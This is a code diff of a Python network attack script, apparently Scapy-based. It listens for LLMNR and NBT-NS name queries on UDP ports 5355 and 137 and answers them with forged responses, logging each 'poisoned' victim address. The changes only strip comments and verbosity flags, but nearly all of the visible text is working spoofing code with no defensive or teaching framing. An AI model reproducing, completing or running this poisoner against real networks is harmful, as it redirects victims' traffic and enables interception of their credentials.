@@ -28,7 +28,7 @@ def llmnr_callback(packet):
 
     llmnr_resp = LLMNRResponse(
         id=llmnr_query.id,
-        qr=1, # Response
+        qr=1,
         tc=0,
         c=0,
         rcode=0,
@@ -46,7 +46,7 @@ def llmnr_callback(packet):
     pkt = ether_o / addr_o / udp_o / llmnr_resp
     print(f"LLMNR poisoned for {addr_i.src}")
 
-    sendp(pkt, iface=IFACE, verbose=3)
+    sendp(pkt, iface=IFACE)
 
 
 
@@ -74,7 +74,6 @@ def build_base_output_data(ether_i, addr_i, udp_i)-> tuple[Ether, IP | IPv6, UDP
 
 
 def nbt_ns_callback(packet):
-    # Ether / IP / UDP / NBNSHeader / NBNSQueryRequest who has '\\DC09'
     ether_i, addr_i, udp_i = extract_base_input_data(packet)
     ether_o, addr_o, udp_o = build_base_output_data(ether_i, addr_i, udp_i)
     nbns_header_i = packet[NBNSHeader]
@@ -106,7 +105,7 @@ def nbt_ns_callback(packet):
     pkt = ether_o / addr_o / udp_o / nbns_header_o / nbns_response
     print(f"NBT-NS poisoned for {addr_i.src}")
 
-    sendp(pkt, iface=IFACE, verbose=3)
+    sendp(pkt, iface=IFACE)
 
 def packet_callback(packet):
     if packet.haslayer(LLMNRQuery):
@@ -117,4 +116,3 @@ def packet_callback(packet):
 sniff(prn=packet_callback, filter="udp port 5355 or udp port 137", iface=IFACE)
 
 
-# Ether / IPv6 / UDP fe80::3c2f:8143:aa26:4716:62799 > ff02::1:3:5355 / LLMNRQuery who has 'ac2.'
